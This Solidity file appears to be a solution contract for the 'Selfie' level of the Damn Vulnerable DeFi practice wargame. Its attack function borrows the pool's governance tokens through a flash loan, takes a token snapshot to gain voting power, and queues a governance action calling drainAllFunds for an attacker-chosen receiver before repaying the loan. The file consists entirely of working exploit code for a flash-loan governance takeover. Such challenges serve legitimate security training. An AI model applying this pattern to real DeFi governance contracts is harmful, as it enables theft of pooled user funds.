// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SimpleGovernance.sol";
import "hardhat/console.sol";


contract SelfieAttacker {

    SelfiePool pool;
    DamnValuableTokenSnapshot DVTtoken;
    SimpleGovernance governance;
    address private receiver;
    uint256 public idAction; 

    constructor(address _poolAddress, address _tokenAddress, address _governanceAddress, address _receiver) {
        pool = SelfiePool(_poolAddress);
        DVTtoken = DamnValuableTokenSnapshot(_tokenAddress);
        governance = SimpleGovernance(_governanceAddress);
        receiver = _receiver;
    }

    function attack(uint256 _amount) external{
        pool.flashLoan(_amount);
    }

    function receiveTokens(address _address, uint256 _amount) external {
        DVTtoken.snapshot();
        bytes memory funcSig = abi.encodeWithSignature("drainAllFunds(address)", receiver);
        idAction = governance.queueAction(address(pool), funcSig, 0);
        DVTtoken.transfer(address(pool), _amount);

    }



}